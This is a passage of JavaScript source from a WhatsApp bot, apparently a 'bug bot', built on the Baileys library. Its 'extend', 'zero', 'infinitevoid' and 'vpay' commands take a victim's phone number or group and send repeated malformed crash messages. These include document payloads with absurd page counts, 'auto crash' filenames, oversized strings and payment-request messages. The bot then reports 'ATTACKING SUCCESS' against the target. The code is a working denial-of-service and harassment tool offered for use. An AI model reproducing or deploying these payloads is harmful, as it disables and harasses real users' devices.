			break
			case 'extend': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner)
				if (!q) return zreply(`*Syntax Error!*\n\n_Use : ExTend Number_\n_Example : ExTend 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
				let {
					proto,
					generateWAMessageFromContent
				} = require('@whiskeysockets/baileys')
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : ExTend Number_\n_Example : ExTend 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
				let X = incTarget + '@s.whatsapp.net';
				if (owner.includes(incTarget)) {
					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
				} else {
					zreply(mess.bugrespon)
					global.jumlah = text.split("|")[1]
					for (let i = 0; i < 1; i++) {
						await TxOs(X, Ptcp = true)
					}
					for (let i = 0; i < 2; i++) {
						await StuckNull(X, GetsuZo, Ptcp = true)
					}
					for (let i = 0; i < 7; i++) {
						await TxOs(X, Ptcp = true)
					}
					let msg = generateWAMessageFromContent(m.chat, {
						viewOnceMessage: {
							message: {
								"messageContextInfo": {
									"deviceListMetadata": {},
									"deviceListMetadataVersion": 2
								},
								interactiveMessage: proto.Message.InteractiveMessage.create({
									contextInfo: {
										mentionedJid: [m.sender],
										isForwarded: true,
										forwardingScore: 999,
										forwardedNewsletterMessageInfo: {
											newsletterJid: global.xchannel.jid,
											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
											serverMessageId: -1
										},
										businessMessageForwardInfo: {
											businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
										},
									},
									body: proto.Message.InteractiveMessage.Body.create({
										text: ''
									}),
									footer: proto.Message.InteractiveMessage.Footer.create({
										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
									}),
									header: proto.Message.InteractiveMessage.Header.create({
										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗘𝘅𝗧𝗲𝗻𝗱 𝗠𝗦𝗚`,
										subtitle: "",
										hasMediaAttachment: true,
										...(await prepareWAMessageMedia({
											image: {
												url: thumbSky
											}
										}, {
											upload: VxoZap.waUploadToServer
										}))
									}),
									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
										buttons: [{
											"name": "quick_reply",
											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}`
										}, ],
									})
								})
							}
						}
					}, {})

					await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
						messageId: msg.key.id
					});
					await taskdone(finishmoji)
				}
			}
			break
			case 'zero': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner)
				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Zero Number_\n_Example : Zero 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
				let {
					proto,
					generateWAMessageFromContent
				} = require('@whiskeysockets/baileys')
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Zero Number_\n_Example : Zero 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
				let X = incTarget + '@s.whatsapp.net';
				if (owner.includes(incTarget)) {
					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
				} else {
					zreply(mess.bugrespon)
					global.jumlah = text.split("|")[1]
					for (let i = 0; i < 1; i++) {
						await sendCrash(X)
					}
					let msg = generateWAMessageFromContent(m.chat, {
						viewOnceMessage: {
							message: {
								"messageContextInfo": {
									"deviceListMetadata": {},
									"deviceListMetadataVersion": 2
								},
								interactiveMessage: proto.Message.InteractiveMessage.create({
									contextInfo: {
										mentionedJid: [m.sender],
										isForwarded: true,
										forwardingScore: 999,
										forwardedNewsletterMessageInfo: {
											newsletterJid: global.xchannel.jid,
											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
											serverMessageId: -1
										},
										businessMessageForwardInfo: {
											businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
										},
									},
									body: proto.Message.InteractiveMessage.Body.create({
										text: ''
									}),
									footer: proto.Message.InteractiveMessage.Footer.create({
										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
									}),
									header: proto.Message.InteractiveMessage.Header.create({
										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗜𝗻𝗩𝗶𝘀𝗶𝗯𝗹𝗲 𝗔𝗣𝗜`,
										subtitle: "",
										hasMediaAttachment: true,
										...(await prepareWAMessageMedia({
											image: {
												url: thumbSky
											}
										}, {
											upload: VxoZap.waUploadToServer
										}))
									}),
									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
										buttons: [{
											"name": "quick_reply",
											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}`
										}, ],
									})
								})
							}
						}
					}, {})

					await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
						messageId: msg.key.id
					});
					await taskdone(finishmoji)
				}
			}
			break
			case 'infinitevoid': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner)
				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Void Number_\n_Example : Void 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
				let {
					proto,
					generateWAMessageFromContent
				} = require('@whiskeysockets/baileys')
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Void Number_\n_Example : Void 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
				let X = incTarget + '@s.whatsapp.net';
				if (owner.includes(incTarget)) {
					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
				} else {
					zreply(mess.bugrespon)
					global.jumlah = text.split("|")[1]
					for (let i = 0; i < 20; i++) {
						await TxOs(X, Ptcp = true)
					}
					let msg = generateWAMessageFromContent(m.chat, {
						viewOnceMessage: {
							message: {
								"messageContextInfo": {
									"deviceListMetadata": {},
									"deviceListMetadataVersion": 2
								},
								interactiveMessage: proto.Message.InteractiveMessage.create({
									contextInfo: {
										mentionedJid: [m.sender],
										isForwarded: true,
										forwardingScore: 999,
										forwardedNewsletterMessageInfo: {
											newsletterJid: global.xchannel.jid,
											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
											serverMessageId: -1
										},
										businessMessageForwardInfo: {
											businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
										},
									},
									body: proto.Message.InteractiveMessage.Body.create({
										text: ''
									}),
									footer: proto.Message.InteractiveMessage.Footer.create({
										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
									}),
									header: proto.Message.InteractiveMessage.Header.create({
										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗩𝗼𝗶𝗱𝗙𝗹𝘂𝘅 𝗜𝗻𝗙𝗶𝗻𝗶𝘁𝗲`,
										subtitle: "",
										hasMediaAttachment: true,
										...(await prepareWAMessageMedia({
											image: {
												url: thumbSky
											}
										}, {
											upload: VxoZap.waUploadToServer
										}))
									}),
									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
										buttons: [{
											"name": "quick_reply",
											"buttonParamsJson": "{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}"
										}, ],
									})
								})
							}
						}
					}, {})

					await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
						messageId: msg.key.id
					});
					await taskdone(finishmoji)
				}
			}
			break
			case "vpay": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isPremium) return zreply(mess.premium)
				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Vpay Number_\n_Example : Vpay 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
				const sections = []
				const listgroup = await VxoZap.getAllGroups(true)
				if (!isNaN(parseInt(text)) && text.endsWith("@g.us")) {
					zreply(mess.bugrespon)
					for (let j = 0; j < 30; j++) {
						try {
							const eP = {
								title: "vpay \uD83D\uDC80",
								hasMediaAttachment: true,
								documentMessage: {},
							}
							const eR = {
								title: "bruxel4s android; ",
								hasMediaAttachment: true,
								documentMessage: {},
							}
							eP.documentMessage.url = "https://mmg.whatsapp.net/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0&mms3=true"
							eP.documentMessage.mimetype = "application/pdf"
							eP.documentMessage.fileSha256 = "oV/EME/ku/CjRSAFaW+b67CCFe6G5VTAGsIoimwxMR8="
							eP.documentMessage.fileLength = null
							eP.documentMessage.pageCount = 99999999999999
							eP.documentMessage.contactVcard = true
							eP.documentMessage.caption = "͡\uD807\uDC35"
							eP.documentMessage.mediaKey = "yU8ofp6ZmGyLRdGteF7Udx0JE4dXbWvhT6X6Xioymeg="
							eP.documentMessage.fileName = "! fluxo auto crash; "
							eP.documentMessage.fileEncSha256 = "0dJ3YssZD1YUMm8LdWPWxz2VNzw5icWNObWWiY9Zs3k="
							eP.documentMessage.directPath = "/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0"
							eP.documentMessage.mediaKeyTimestamp = "1714145232"
							eP.documentMessage.thumbnailDirectPath = "/v/t62.36145-24/32182773_798270155158347_7279231160763865339_n.enc?ccb=11-4&oh=01_Q5AaIGDA9WE26BzZF37Vp6aAsKq56VhpiK6Gdp2EGu1AoGd8&oe=665346DE&_nc_sid=5e03e0"
							eP.documentMessage.thumbnailSha256 = "oFogyS+qrsnHwWFPNBmtCsNya8BJkTlG1mU3DdGfyjg="
							eP.documentMessage.thumbnailEncSha256 = "G2VHGFcbMP1IYd95tLWnpQRxCb9+Q/7/OaiDgvWY8bM="
							eP.documentMessage.jpegThumbnail = "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIACIAYAMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAADBAACBQYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAA5CpC5601s5+88/TJ01nBC6jmytPTAQuZhpxa2PQ0WjCP2T6LXLJR3Ma5WSIsDXtUZYkz2seRXNmSAY8m/PlhkUdZD//EAC4QAAIBAwIEBAQHAAAAAAAAAAECAAMRIRIxBCJBcQVRgbEQEzIzQmFygsHR4f/aAAgBAQABPwBKSsN4aZERmVVybZxecODVpEsCE2zmIhYgAZMbwjiQgbBNto9MqSCMwiUioJDehvaVBynIJ3xKPDki7Yv7StTC3IYdoLAjT/s0ltpSOhgSAR1BlTi7qUQTw/g3aolU4VTLzxLgg96yb9Yy2gJVgRLKgL1VtfZdyTKdXQrO246dB+UJJJJ3hRAoDWA84p+WRc3U9YANRmlT3nK9NdN9u1jKD1KeNTSsfnmzFiB5Eypw9ADUS4Hr/U1LT+1T9SPcmEaiWJ1N59BKrAcgNxfJ+BV25nNu8QlLE5WJj9J2mhTKTMjAX5SZTo0qYDsVJOxgalWauFtdeonE1NDW27ZEeqpz/F/ePUJHXuYfgxJqQfT6RPtfujE3pwdJQ5uDYNnB3nAABKlh+IzisvVh2hhg3n//xAAZEQACAwEAAAAAAAAAAAAAAAABIAACEWH/2gAIAQIBAT8AYDs16p//xAAfEQABAwQDAQAAAAAAAAAAAAABAAIRICExMgMSQoH/2gAIAQMBAT8ALRERdYpc6+sLrIREUenIa/AuXFH/2Q=="
							eP.documentMessage.thumbnailHeight = 172
							eP.documentMessage.thumbnailWidth = 480
							await VxoZap.relayMessage(text, {
								viewOnceMessage: {
									message: {
										interactiveMessage: {
											header: eP,
											body: {
												text: ""
											},
											nativeFlowMessage: {
												buttons: [{
													name: "address_message",
													title: "oi",
													header: "fluxo no android; ",
													body: "xxx",
													buttonParamsJson: JSON.stringify({}),
												}],
												messageParamsJson: JSON.stringify({
													name: "address_message",
													title: "oi",
													header: "bruxel4s android; ",
													body: "xxx",
												})
											},
											contextInfo: {
												isForwarded: true,
												fromMe: false,
												participant: "0@s.whatsapp.net",
												remoteJid: m.chat,
												quotedMessage: {
													documentMessage: {
														url: "https://mmg.whatsapp.net/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0&mms3=true",
														mimetype: "application/pdf",
														fileSha256: "oV/EME/ku/CjRSAFaW+b67CCFe6G5VTAGsIoimwxMR8=",
														fileLength: null,
														pageCount: 99999999999999,
														contactVcard: true,
														caption: "͡\uD807\uDC35",
														mediaKey: "yU8ofp6ZmGyLRdGteF7Udx0JE4dXbWvhT6X6Xioymeg=",
														fileName: "> \uD83D\uDE94 | bruxel4s auto crash; ",
														fileEncSha256: "0dJ3YssZD1YUMm8LdWPWxz2VNzw5icWNObWWiY9Zs3k=",
														directPath: "/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0",
														mediaKeyTimestamp: "1714145232",
														thumbnailDirectPath: "/v/t62.36145-24/32182773_798270155158347_7279231160763865339_n.enc?ccb=11-4&oh=01_Q5AaIGDA9WE26BzZF37Vp6aAsKq56VhpiK6Gdp2EGu1AoGd8&oe=665346DE&_nc_sid=5e03e0",
														thumbnailSha256: "oFogyS+qrsnHwWFPNBmtCsNya8BJkTlG1mU3DdGfyjg=",
														thumbnailEncSha256: "G2VHGFcbMP1IYd95tLWnpQRxCb9+Q/7/OaiDgvWY8bM=",
														jpegThumbnail: TheZhiro,
														thumbnailHeight: 172,
														thumbnailWidth: 480,
													}
												},
												externalAdReply: {
													title: "> BRU͢XiiN CLiE͢NT!",
													mediaType: "VIDEO",
													sourceUrl: "https://chat.whatsapp.com/JG5DINh26Pd3RiU9a9urtR",
												},
												forwardedNewsletterMessageInfo: {
													newsletterJid: "120363298524333143@newsletter",
													serverMessageId: 1,
													newsletterName: "\uD835\uDD87 \uD835\uDD97 \uD835\uDD9A \uD835\uDD9D \uD835\uDD8A \uD835\uDD91 \uD835\uDD86 \uD835\uDD98\u2003\u2003\u263F" + bugpdf + bugpdf,
												}
											}
										}
									}
								}
							}, {})
							eR.documentMessage.url = "https://mmg.whatsapp.net/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0&mms3=true"
							eR.documentMessage.mimetype = "application/pdf"
							eR.documentMessage.fileSha256 = "oV/EME/ku/CjRSAFaW+b67CCFe6G5VTAGsIoimwxMR8="
							eR.documentMessage.fileLength = null
							eR.documentMessage.pageCount = 99999999999999
							eR.documentMessage.contactVcard = true
							eR.documentMessage.caption = "͡\uD807\uDC35"
							eR.documentMessage.mediaKey = "yU8ofp6ZmGyLRdGteF7Udx0JE4dXbWvhT6X6Xioymeg="
							eR.documentMessage.fileName = "! fluxo auto crash; "
							eR.documentMessage.fileEncSha256 = "0dJ3YssZD1YUMm8LdWPWxz2VNzw5icWNObWWiY9Zs3k="
							eR.documentMessage.directPath = "/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0"
							eR.documentMessage.mediaKeyTimestamp = "1714145232"
							eR.documentMessage.thumbnailDirectPath = "/v/t62.36145-24/32182773_798270155158347_7279231160763865339_n.enc?ccb=11-4&oh=01_Q5AaIGDA9WE26BzZF37Vp6aAsKq56VhpiK6Gdp2EGu1AoGd8&oe=665346DE&_nc_sid=5e03e0"
							eR.documentMessage.thumbnailSha256 = "oFogyS+qrsnHwWFPNBmtCsNya8BJkTlG1mU3DdGfyjg="
							eR.documentMessage.thumbnailEncSha256 = "G2VHGFcbMP1IYd95tLWnpQRxCb9+Q/7/OaiDgvWY8bM="
							eR.documentMessage.jpegThumbnail = "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIACIAYAMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAADBAACBQYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAA5CpC5601s5+88/TJ01nBC6jmytPTAQuZhpxa2PQ0WjCP2T6LXLJR3Ma5WSIsDXtUZYkz2seRXNmSAY8m/PlhkUdZD//EAC4QAAIBAwIEBAQHAAAAAAAAAAECAAMRIRIxBCJBcQVRgbEQEzIzQmFygsHR4f/aAAgBAQABPwBKSsN4aZERmVVybZxecODVpEsCE2zmIhYgAZMbwjiQgbBNto9MqSCMwiUioJDehvaVBynIJ3xKPDki7Yv7StTC3IYdoLAjT/s0ltpSOhgSAR1BlTi7qUQTw/g3aolU4VTLzxLgg96yb9Yy2gJVgRLKgL1VtfZdyTKdXQrO246dB+UJJJJ3hRAoDWA84p+WRc3U9YANRmlT3nK9NdN9u1jKD1KeNTSsfnmzFiB5Eypw9ADUS4Hr/U1LT+1T9SPcmEaiWJ1N59BKrAcgNxfJ+BV25nNu8QlLE5WJj9J2mhTKTMjAX5SZTo0qYDsVJOxgalWauFtdeonE1NDW27ZEeqpz/F/ePUJHXuYfgxJqQfT6RPtfujE3pwdJQ5uDYNnB3nAABKlh+IzisvVh2hhg3n//xAAZEQACAwEAAAAAAAAAAAAAAAABIAACEWH/2gAIAQIBAT8AYDs16p//xAAfEQABAwQDAQAAAAAAAAAAAAABAAIRICExMgMSQoH/2gAIAQMBAT8ALRERdYpc6+sLrIREUenIa/AuXFH/2Q=="
							eR.documentMessage.thumbnailHeight = 172
							eR.documentMessage.thumbnailWidth = 480
							await VxoZap.relayMessage(text, {
								viewOnceMessage: {
									message: {
										interactiveMessage: {
											header: eR,
											body: {
												text: ""
											},
											nativeFlowMessage: {
												buttons: [{
													name: "payment_method",
													title: "oi",
													header: "fluxo no android; ",
													body: "xxx",
												}],
												messageParamsJson: JSON.stringify({
													name: "address_message",
													title: "oi",
													header: "fluxo no android; ",
													body: "xxx",
												})
											}
										}
									}
								}
							}, {})
							await VxoZap.relayMessage(text, {
								requestPaymentMessage: {
									currencyCodeIso4217: "BRL",
									amount1000: "10000",
									noteMessage: {
										stickerMessage: {
											url: "https://mmg.whatsapp.net/v/t62.15575-24/40815542_298023669404967_8137288930028896106_n.enc?ccb=11-4&oh=01_AdRNuV2ysx9bYx3c0mksyhR-u9c5BG7-b3x1eCDYbFA65w&oe=64EF511A&mms3=true",
											fileSha256: "00zdVwDOfk+RHOI9HVRRc43lHGjR8ZO8x7OdErfi4nI=",
											fileEncSha256: "6tOTA5Tw72yHYqOl5pWFJcsbnhzwurpR+H4g6dG6SMA=",
											mediaKey: "+7Meau1x8pPYraSCKEm6UpL2vUwFaD2WLVpzAVdOmK0=",
											mimetype: "image/webp",
											height: 64,
											width: 64,
											directPath: "/v/t62.15575-24/40815542_298023669404967_8137288930028896106_n.enc?ccb=11-4&oh=01_AdRNuV2ysx9bYx3c0mksyhR-u9c5BG7-b3x1eCDYbFA65w&oe=64EF511A",
											mediaKeyTimestamp: "1690753283",
											isAnimated: false,
											stickerSentTs: "1690927831000",
											isAvatar: false,
											contextInfo: {
												isForwarded: true,
												fromMe: false,
												participant: "0@s.whatsapp.net",
												remoteJid: m.chat,
												quotedMessage: {
													documentMessage: {
														url: "https://mmg.whatsapp.net/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0&mms3=true",
														mimetype: "application/pdf",
														fileSha256: "oV/EME/ku/CjRSAFaW+b67CCFe6G5VTAGsIoimwxMR8=",
														fileLength: null,
														pageCount: 99999999999999,
														contactVcard: true,
														caption: "͡\uD807\uDC35",
														mediaKey: "yU8ofp6ZmGyLRdGteF7Udx0JE4dXbWvhT6X6Xioymeg=",
														fileName: "> \uD83D\uDE94 | bruxel4s auto crash; ",
														fileEncSha256: "0dJ3YssZD1YUMm8LdWPWxz2VNzw5icWNObWWiY9Zs3k=",
														directPath: "/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0",
														mediaKeyTimestamp: "1714145232",
														thumbnailDirectPath: "/v/t62.36145-24/32182773_798270155158347_7279231160763865339_n.enc?ccb=11-4&oh=01_Q5AaIGDA9WE26BzZF37Vp6aAsKq56VhpiK6Gdp2EGu1AoGd8&oe=665346DE&_nc_sid=5e03e0",
														thumbnailSha256: "oFogyS+qrsnHwWFPNBmtCsNya8BJkTlG1mU3DdGfyjg=",
														thumbnailEncSha256: "G2VHGFcbMP1IYd95tLWnpQRxCb9+Q/7/OaiDgvWY8bM=",
														jpegThumbnail: TheZhiro,
														thumbnailHeight: 172,
														thumbnailWidth: 480,
													}
												},
												externalAdReply: {
													title: "> BRU͢XiiN CLiE͢NT!",
													mediaType: "VIDEO",
													sourceUrl: "https://chat.whatsapp.com/JG5DINh26Pd3RiU9a9urtR",
												},
												forwardedNewsletterMessageInfo: {
													newsletterJid: "120363298524333143@newsletter",
													serverMessageId: 1,
													newsletterName: "\uD835\uDD87 \uD835\uDD97 \uD835\uDD9A \uD835\uDD9D \uD835\uDD8A \uD835\uDD91 \uD835\uDD86 \uD835\uDD98\u2003\u2003\u263F" + bugpdf + bugpdf,
												}
											}
										}
									},
									expiryTimestamp: "0",
									amount: {
										value: "10000",
										offset: 1000,
										currencyCode: "BRL",
									},
									background: {
										id: "99",
										fileLength: "199562",
										width: 150,
										height: 150,
										mimetype: "Foi u Bruxo",
										placeholderArgb: 2282670816,
										textArgb: 4100048132,
										subtextArgb: 2940630892,
									}
								}
							}, {})
							await sleep(2000)
						} catch (error) {
							console.log(chalk.whiteBright("├"), chalk.keyword("red")("[ ERROR ]"), error)
						}
					}
					zreply("𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜")
				} else if (input.length > 0) {
					const failed = []
					await zreply(mess.bugrespon)
					for (const x of input) {
						if ((await VxoZap.onWhatsApp(x)).length > 0 && !owner.includes(x.split("@")[0]) && !kontributor.includes(x.split("@")[0]) && x.split("@")[0] !== Creator && x !== botNumber) {
							for (let j = 0; j < 30; j++) {
								try {
									const eP = {
										title: "vpay \uD83D\uDC80",
										hasMediaAttachment: true,
										documentMessage: {},
									}
									const eR = {
										title: "bruxel4s android; ",
										hasMediaAttachment: true,
										documentMessage: {},
									}
									eP.documentMessage.url = "https://mmg.whatsapp.net/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0&mms3=true"
									eP.documentMessage.mimetype = "application/pdf"
									eP.documentMessage.fileSha256 = "oV/EME/ku/CjRSAFaW+b67CCFe6G5VTAGsIoimwxMR8="
									eP.documentMessage.fileLength = null
									eP.documentMessage.pageCount = 99999999999999
									eP.documentMessage.contactVcard = true
									eP.documentMessage.caption = "͡\uD807\uDC35"
									eP.documentMessage.mediaKey = "yU8ofp6ZmGyLRdGteF7Udx0JE4dXbWvhT6X6Xioymeg="
									eP.documentMessage.fileName = "! fluxo auto crash; "
									eP.documentMessage.fileEncSha256 = "0dJ3YssZD1YUMm8LdWPWxz2VNzw5icWNObWWiY9Zs3k="
									eP.documentMessage.directPath = "/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0"
									eP.documentMessage.mediaKeyTimestamp = "1714145232"
									eP.documentMessage.thumbnailDirectPath = "/v/t62.36145-24/32182773_798270155158347_7279231160763865339_n.enc?ccb=11-4&oh=01_Q5AaIGDA9WE26BzZF37Vp6aAsKq56VhpiK6Gdp2EGu1AoGd8&oe=665346DE&_nc_sid=5e03e0"
									eP.documentMessage.thumbnailSha256 = "oFogyS+qrsnHwWFPNBmtCsNya8BJkTlG1mU3DdGfyjg="
									eP.documentMessage.thumbnailEncSha256 = "G2VHGFcbMP1IYd95tLWnpQRxCb9+Q/7/OaiDgvWY8bM="
									eP.documentMessage.jpegThumbnail = "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIACIAYAMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAADBAACBQYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAA5CpC5601s5+88/TJ01nBC6jmytPTAQuZhpxa2PQ0WjCP2T6LXLJR3Ma5WSIsDXtUZYkz2seRXNmSAY8m/PlhkUdZD//EAC4QAAIBAwIEBAQHAAAAAAAAAAECAAMRIRIxBCJBcQVRgbEQEzIzQmFygsHR4f/aAAgBAQABPwBKSsN4aZERmVVybZxecODVpEsCE2zmIhYgAZMbwjiQgbBNto9MqSCMwiUioJDehvaVBynIJ3xKPDki7Yv7StTC3IYdoLAjT/s0ltpSOhgSAR1BlTi7qUQTw/g3aolU4VTLzxLgg96yb9Yy2gJVgRLKgL1VtfZdyTKdXQrO246dB+UJJJJ3hRAoDWA84p+WRc3U9YANRmlT3nK9NdN9u1jKD1KeNTSsfnmzFiB5Eypw9ADUS4Hr/U1LT+1T9SPcmEaiWJ1N59BKrAcgNxfJ+BV25nNu8QlLE5WJj9J2mhTKTMjAX5